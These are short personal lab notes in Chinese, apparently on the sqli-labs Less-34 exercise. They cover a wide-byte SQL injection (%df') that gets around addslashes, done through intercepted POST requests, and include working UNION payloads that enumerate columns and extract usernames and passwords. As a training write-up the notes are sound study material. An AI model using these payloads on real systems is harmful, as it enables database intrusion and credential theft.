 uname 测试admin'号，报错，被转义

passwd测试admin',报错，被转义

推测为addslashes 宽字节注入





拿burp抓包，

改post



admin'报错，

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin' LIMIT 0,1' at line 1
```





再抓包，测回显列。

![](/home/de0xy/Documents/penetration/web/sql 注入/SqlinjecNotes/images/Less-34.png)



测表名，

爆列

```
uname=admin%df' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273# &passwd=admin&submit=Submit

这里'被转义了，同样要用ascil hex编码
```



爆username,password

```
uname=admin%df' union select 1,(select group_concat(username,password) from security.users) # &passwd=admin&submit=Submit
```



![](/home/de0xy/Documents/penetration/web/sql 注入/SqlinjecNotes/images/Less-34(2).png)
